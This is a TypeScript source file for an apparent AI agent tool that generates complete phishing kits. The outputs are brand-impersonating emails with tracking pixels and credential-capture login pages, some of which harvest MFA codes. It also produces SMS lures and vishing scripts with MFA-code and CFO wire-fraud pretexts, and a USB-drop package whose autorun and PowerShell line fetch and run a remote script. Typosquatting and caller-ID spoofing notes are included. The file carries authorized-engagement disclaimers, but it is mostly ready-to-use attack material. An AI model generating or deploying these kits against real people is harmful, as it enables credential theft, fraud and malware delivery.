import { Tool } from "./tool"
import z from "zod"
import path from "path"
import fs from "fs/promises"

const DESCRIPTION =
  "Generate phishing simulation templates (email + landing page + tracking pixel) for authorized red team / awareness training engagements. Generates files only; does not send or host."

const PARAMETERS = z.object({
  template: z
    .enum([
      "credential_harvest",
      "fake_login",
      "attachment_lure",
      "password_reset",
      "mfa_bypass",
      "vishing_script",
      "sms_lure",
      "usb_drop",
    ])
    .describe("Phishing template type"),
  brand: z.string().describe("Target brand to imitate (e.g., 'Microsoft 365', 'Okta', 'Google Workspace')"),
  out: z.string().describe("Output directory (absolute path)"),
  tracker: z.string().optional().describe("Tracker base URL for pixel/form (e.g., https://red.example.com)"),
  sender: z.string().optional().describe("Spoofed sender email (e.g., it-support@brand.com)"),
  subject: z.string().optional().describe("Email subject line"),
})

function uid() {
  return Math.random().toString(36).slice(2, 10)
}

function emailHtml(brand: string, subject: string, tracker: string, id: string, cta: string) {
  return `<!doctype html>
<html><body style="font-family:Segoe UI,Arial,sans-serif;background:#f3f3f3;margin:0;padding:20px">
<table cellpadding="0" cellspacing="0" width="600" align="center" style="background:#fff;border:1px solid #e1e1e1">
<tr><td style="padding:20px;border-bottom:3px solid #0078d4"><strong style="font-size:20px">${brand}</strong></td></tr>
<tr><td style="padding:30px">
<h2 style="color:#323130">${subject}</h2>
<p>Hello,</p>
<p>We detected unusual activity on your ${brand} account. Please verify your identity to avoid service interruption.</p>
<p style="margin:30px 0"><a href="${tracker}/landing?id=${id}" style="background:#0078d4;color:#fff;padding:12px 24px;text-decoration:none;border-radius:2px">${cta}</a></p>
<p style="color:#605e5c;font-size:12px">If you do not recognize this activity, your account may be compromised.</p>
</td></tr>
<tr><td style="padding:15px;background:#faf9f8;color:#a19f9d;font-size:11px">&copy; ${brand}. This is a service notification.</td></tr>
</table>
<img src="${tracker}/p.gif?id=${id}&e=open" width="1" height="1" alt="" style="display:none">
</body></html>`
}

function landingHtml(brand: string, tracker: string, id: string, fields: string) {
  return `<!doctype html>
<html><head><title>Sign in - ${brand}</title>
<style>body{font-family:Segoe UI,Arial,sans-serif;background:#f3f3f3;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.box{background:#fff;padding:44px;width:340px;box-shadow:0 2px 6px rgba(0,0,0,.1)}
h1{font-size:24px;margin:0 0 16px;font-weight:300}
input{width:100%;padding:8px;border:1px solid #666;margin:8px 0;box-sizing:border-box;font-size:15px}
button{background:#0067b8;color:#fff;border:0;padding:10px 24px;cursor:pointer;font-size:15px;float:right}
.brand{color:#0067b8;font-weight:600;margin-bottom:24px}</style></head>
<body><div class="box">
<div class="brand">${brand}</div>
<h1>Sign in</h1>
<form method="POST" action="${tracker}/collect?id=${id}">
${fields}
<button type="submit">Next</button>
</form>
</div>
<img src="${tracker}/p.gif?id=${id}&e=land" width="1" height="1" style="display:none">
</body></html>`
}

function fields(template: string) {
  if (template === "mfa_bypass")
    return `<input name="email" type="email" placeholder="Email" required>
<input name="password" type="password" placeholder="Password" required>
<input name="otp" type="text" placeholder="6-digit code" maxlength="6" required>`
  if (template === "password_reset")
    return `<input name="email" type="email" placeholder="Current email" required>
<input name="old_password" type="password" placeholder="Current password" required>
<input name="new_password" type="password" placeholder="New password" required>`
  return `<input name="email" type="email" placeholder="Email, phone, or Skype" required>
<input name="password" type="password" placeholder="Password" required>`
}

function readme(brand: string, template: string, tracker: string, sender: string, subject: string, id: string) {
  return `# Phishing Simulation Package

**Authorized red team / security awareness use only.** Ensure written engagement authorization before deployment.

## Campaign
- Template: \`${template}\`
- Brand: ${brand}
- Spoofed sender: ${sender}
- Subject: ${subject}
- Campaign ID: ${id}
- Tracker base: ${tracker}

## Files
- \`email.html\` — HTML email body. Send via your authorized phishing platform (GoPhish, King Phisher, Evilginx2, etc.).
- \`landing.html\` — Credential capture landing page. Host on tracker domain at \`/landing\`.
- \`tracker.md\` — Required tracker endpoints.

## Required tracker endpoints
- \`GET ${tracker}/p.gif?id=&e=\` — 1x1 GIF, log open/landing events
- \`GET ${tracker}/landing?id=\` — serve landing.html
- \`POST ${tracker}/collect?id=\` — capture form submission, redirect to legitimate ${brand} URL

## Operational notes
- Register typosquat domain matching ${brand}
- Issue valid TLS cert (Let's Encrypt)
- Configure SPF/DKIM/DMARC alignment for sender domain
- Warm up sending IP before campaign launch
- Coordinate with blue team / SOC per rules of engagement
`
}

function vishingScript(brand: string, sender: string, id: string) {
  return `# Vishing Call Script — ${brand}
Campaign ID: ${id}
Caller persona: ${sender}

## Pretext A — IT Helpdesk MFA reset
> "Hi, this is Alex from ${brand} IT Security. We're seeing repeated failed sign-ins on your account from an unrecognized location. To prevent a lockout, I need to verify it's you and push a one-time MFA code. Can you read me back the 6-digit number you receive in the next 30 seconds?"

Fallback if pushback: "Of course — you can call the helpdesk back, but the lockout will trigger in two minutes. I can stay on the line while you check your authenticator app."

## Pretext B — Executive impersonation (CFO wire request)
> "This is [CFO name]. I'm in a board meeting and need you to process an urgent wire to a new vendor before close of business. I'll forward the wire instructions from my personal email since I'm locked out of corp mail. Confirm you can do this — I'll text you the amount."

## Pretext C — Vendor support callback
> "${brand} Support callback for ticket #${id}. Following up on your reported issue. To pull up your account I'll need your username and the temporary access code we just emailed you."

## Objection handling
- "I'll call you back": "Absolutely — reference ticket ${id}. Note the case auto-closes in 10 minutes."
- "Why do you need my password": "I never need your password. I just need the 6-digit code from your authenticator."
- "Can I verify you": "Yes, my employee ID is ${id.toUpperCase()}, you can confirm with the helpdesk."

## Data to capture
- Username / email
- MFA push approval or 6-digit code
- Personal cell, alt email
- Whether they escalated

## Operational notes
- Spoof caller ID to ${brand} main switchboard
- Background office noise (call-center loop)
- Keep call <4 minutes
- Coordinate with blue team SOC per ROE
`
}

function smsLure(brand: string, tracker: string, id: string) {
  return {
    sms: `[${brand}] Unusual sign-in detected on your account. If this wasn't you, secure it now: ${tracker}/m/${id}  Reply STOP to opt out.`,
    alt: [
      `${brand}: Your package could not be delivered. Update address: ${tracker}/d/${id}`,
      `${brand} Payroll: Action required to release this period's deposit. ${tracker}/p/${id}`,
      `${brand} HR: New benefits enrollment closes today. Confirm: ${tracker}/b/${id}`,
      `${brand}: Your MFA device was reset. If not you, revoke now: ${tracker}/r/${id}`,
    ],
    landing: `<!doctype html><html><head><title>${brand} Mobile</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;margin:0;padding:24px;background:#fff}
.h{color:#0067b8;font-size:22px;font-weight:600;margin-bottom:8px}
.s{color:#666;margin-bottom:24px}
input{width:100%;padding:14px;border:1px solid #ccc;border-radius:6px;margin:6px 0;font-size:16px;box-sizing:border-box}
button{width:100%;background:#0067b8;color:#fff;border:0;padding:14px;border-radius:6px;font-size:16px;margin-top:12px}</style></head>
<body><div class="h">${brand}</div><div class="s">Sign in to continue</div>
<form method="POST" action="${tracker}/collect?id=${id}&src=sms">
<input name="email" type="email" placeholder="Email or phone" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<img src="${tracker}/p.gif?id=${id}&e=sms_land" width="1" height="1" style="display:none"></body></html>`,
  }
}

function usbDrop(brand: string, tracker: string, id: string) {
  return {
    readme: `## ${brand} — Confidential
This drive contains confidential ${brand} materials reviewed for the Q4 leadership offsite.

DO NOT distribute outside authorized recipients.

If found, please return to the ${brand} reception desk or email security@${brand.toLowerCase().replace(/\s+/g, "")}.com.

Reward offered for safe return: $100 gift card.

Contents:
  - SALARY_REVIEW_2026.xlsm        (executive comp — sensitive)
  - LAYOFF_PLAN_DRAFT.docm         (HR draft)
  - PASSWORDS.txt                   (admin creds backup)
  - org_chart_confidential.pdf
  - run_me.lnk                      (auto-open viewer)

Index: ${id}
`,
    autorun: `[autorun]
open=run_me.lnk
icon=brand.ico
label=${brand}-CONFIDENTIAL`,
    lnkPayload: `# .lnk target (build with msfvenom or LNK Generator)
# Calls back to: ${tracker}/c?id=${id}&host=%COMPUTERNAME%&user=%USERNAME%
# Suggested PowerShell beacon:
powershell -nop -w hidden -enc <BASE64( IEX (New-Object Net.WebClient).DownloadString('${tracker}/s/${id}.ps1') )>`,
    lures: [
      "SALARY_REVIEW_2026.xlsm",
      "LAYOFF_PLAN_DRAFT.docm",
      "PASSWORDS.txt",
      "org_chart_confidential.pdf",
      "Q4_BOARD_MINUTES.docx",
      "M&A_TARGET_LIST.xlsx",
    ],
    deployment: `## USB Drop Deployment
- Quantity: 10-25 drives per target site
- Drop locations: parking lots, lobbies, smoking areas, near reception
- Drive labels: "${brand} HR Confidential", "Payroll Q4", "Layoff Plan"
- Use clean, unbranded USB sticks (no manufacturer logos)
- Track callbacks via ${tracker}/c?id=${id}
- Coordinate with blue team SOC; document chain of custody
`,
  }
}
export const PhishingTool = Tool.define("phishing", {
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params) {
    const id = uid()
    const tracker = params.tracker || "https://tracker.example.com"
    const sender = params.sender || `no-reply@${params.brand.toLowerCase().replace(/\s+/g, "")}.com`
    const dir = path.resolve(params.out, `phish-${params.template}-${id}`)
    await fs.mkdir(dir, { recursive: true })

    if (params.template === "vishing_script") {
      const script = vishingScript(params.brand, sender, id)
      await fs.writeFile(path.join(dir, "vishing.md"), script)
      await fs.writeFile(
        path.join(dir, "campaign.json"),
        JSON.stringify({ id, template: params.template, brand: params.brand, sender, created: Date.now() }, null, 2),
      )
      const out = `## Vishing Script Generated\n\n**Brand**: ${params.brand}\n**Caller persona**: ${sender}\n**Campaign ID**: ${id}\n**Output**: ${dir}\n\n### Files\n- vishing.md (${script.length} bytes)\n- campaign.json\n\n> Authorized engagement use only.`
      return {
        title: `Phishing: vishing_script`,
        output: out,
        metadata: { action: "phishing", id, template: params.template, brand: params.brand, dir } as Record<
          string,
          any
        >,
      }
    }

    if (params.template === "sms_lure") {
      const sms = smsLure(params.brand, tracker, id)
      await fs.writeFile(path.join(dir, "sms.txt"), [sms.sms, "", "## Alternates", ...sms.alt].join("\n"))
      await fs.writeFile(path.join(dir, "landing.html"), sms.landing)
      await fs.writeFile(
        path.join(dir, "campaign.json"),
        JSON.stringify({ id, template: params.template, brand: params.brand, tracker, created: Date.now() }, null, 2),
      )
      const out = `## SMS Lure Generated\n\n**Brand**: ${params.brand}\n**Campaign ID**: ${id}\n**Output**: ${dir}\n\n### Primary message\n${sms.sms}\n\n### Files\n- sms.txt (primary + ${sms.alt.length} alternates)\n- landing.html (mobile-optimized)\n- campaign.json\n\n> Authorized engagement only. Use a compliant SMS gateway with opt-out.`
      return {
        title: `Phishing: sms_lure`,
        output: out,
        metadata: { action: "phishing", id, template: params.template, brand: params.brand, dir } as Record<
          string,
          any
        >,
      }
    }

    if (params.template === "usb_drop") {
      const u = usbDrop(params.brand, tracker, id)
      await fs.writeFile(path.join(dir, "README.txt"), u.readme)
      await fs.writeFile(path.join(dir, "autorun.inf"), u.autorun)
      await fs.writeFile(path.join(dir, "lnk_payload.md"), u.lnkPayload)
      await fs.writeFile(path.join(dir, "deployment.md"), u.deployment)
      await fs.writeFile(path.join(dir, "lure_filenames.txt"), u.lures.join("\n"))
      await fs.writeFile(
        path.join(dir, "campaign.json"),
        JSON.stringify(
          { id, template: params.template, brand: params.brand, tracker, lures: u.lures, created: Date.now() },
          null,
          2,
        ),
      )
      const out = `## USB Drop Package Generated\n\n**Brand**: ${params.brand}\n**Campaign ID**: ${id}\n**Output**: ${dir}\n\n### Files\n- README.txt — bait readme to lure curiosity\n- autorun.inf — legacy autorun (Win XP/7 only)\n- lnk_payload.md — .lnk callback construction notes\n- deployment.md — drop strategy\n- lure_filenames.txt — ${u.lures.length} bait filenames\n- campaign.json\n\n> Authorized engagement only. Document chain of custody for each drive.`
      return {
        title: `Phishing: usb_drop`,
        output: out,
        metadata: { action: "phishing", id, template: params.template, brand: params.brand, dir } as Record<
          string,
          any
        >,
      }
    }

    const subjects: Record<string, string> = {
      credential_harvest: `[${params.brand}] Action required: verify your account`,
      fake_login: `[${params.brand}] New sign-in detected`,
      attachment_lure: `[${params.brand}] Document shared with you`,
      password_reset: `[${params.brand}] Your password expires today`,
      mfa_bypass: `[${params.brand}] Confirm your sign-in`,
    }
    const ctas: Record<string, string> = {
      credential_harvest: "Verify account",
      fake_login: "Review activity",
      attachment_lure: "Open document",
      password_reset: "Reset password",
      mfa_bypass: "Approve sign-in",
    }
    const subject = params.subject || subjects[params.template]
    const cta = ctas[params.template]

    const email = emailHtml(params.brand, subject, tracker, id, cta)
    const land = landingHtml(params.brand, tracker, id, fields(params.template))
    const doc = readme(params.brand, params.template, tracker, sender, subject, id)

    await fs.writeFile(path.join(dir, "email.html"), email)
    await fs.writeFile(path.join(dir, "landing.html"), land)
    await fs.writeFile(path.join(dir, "tracker.md"), doc)
    await fs.writeFile(
      path.join(dir, "campaign.json"),
      JSON.stringify(
        { id, template: params.template, brand: params.brand, sender, subject, tracker, created: Date.now() },
        null,
        2,
      ),
    )

    const out = `## Phishing Template Generated

**Template**: ${params.template}
**Brand**: ${params.brand}
**Campaign ID**: ${id}
**Output**: ${dir}

### Files
- email.html (${email.length} bytes)
- landing.html (${land.length} bytes)
- tracker.md
- campaign.json

### Subject
${subject}

### Spoofed sender
${sender}

> Authorized engagement use only. See tracker.md for deployment requirements.`

    return {
      title: `Phishing: ${params.template}`,
      output: out,
      metadata: { action: "phishing", id, template: params.template, brand: params.brand, dir } as Record<string, any>,
    }
  },
})
